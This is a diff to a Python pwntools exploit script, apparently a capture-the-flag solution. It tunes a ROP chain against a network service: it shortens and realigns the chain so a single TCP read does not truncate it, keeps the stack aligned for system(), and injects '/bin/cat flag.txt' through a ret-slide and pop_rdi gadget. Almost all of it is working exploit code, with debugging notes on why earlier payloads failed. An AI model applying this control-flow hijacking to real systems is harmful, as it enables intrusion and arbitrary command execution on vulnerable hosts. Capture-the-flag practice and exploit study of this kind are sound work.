@@ -210,15 +210,19 @@ def main():
 
     SLIDE_START = OFF - 0x10      # data offset that maps to saved_rip
     data_addr   = stack_target + 0x10
-    # After the slide, system() is entered with rsp == saved_rip + TAIL. It must
-    # be 16-byte aligned or the movaps in do_system() segfaults (the "reached the
-    # read but no output" symptom). Pick TAIL so (saved_rip + TAIL) % 16 == 0.
-    TAIL = 0xb0
+    # Keep the chain SHORT and place its tail right after the return slot, so the
+    # whole thing lands within the first ~0x50 bytes. The server reads the data
+    # with a single read(); over TCP that read can return short and truncate a
+    # tail placed late (that's why a 0xb8 tail gave "reached read but no flag").
+    # system() is entered with rsp == saved_rip + TAIL, which must be 16-aligned
+    # (else movaps in do_system segfaults). Pick the smallest aligned TAIL.
+    TAIL = SLIDE_START + 0x10     # just past the return slot (leaves 2 ret slots)
     while (saved_rip + TAIL) % 16 != 0:
         TAIL += 8
     STR_OFF   = TAIL + 0x18
     cmd_addr  = data_addr + STR_OFF
-    log.info(f"TAIL={hex(TAIL)}  system entry rsp={hex((saved_rip + TAIL) & 0xf)} (want 0)")
+    log.info(f"TAIL={hex(TAIL)} chain_end={hex(STR_OFF+0x14)} "
+             f"sys_rsp&0xf={hex((saved_rip + TAIL) & 0xf)} (want 0)")
 
     data = bytearray()
     data += p64(ret) * (0xe8 // 8)          # baseline ret-slide everywhere
@@ -230,7 +234,8 @@ def main():
     put(TAIL,        pop_rdi)
     put(TAIL + 0x08, cmd_addr)
     put(TAIL + 0x10, system)
-    data[STR_OFF:STR_OFF + 13] = b"cat flag.txt\x00"
+    cmd = b"/bin/cat flag.txt\x00"      # absolute path in case PATH is minimal
+    data[STR_OFF:STR_OFF + len(cmd)] = cmd
 
     log.success("sending final ROP chain")
     choose("Add a node"); io.recvuntil(b"Size?"); io.sendline(str(0xe8).encode())
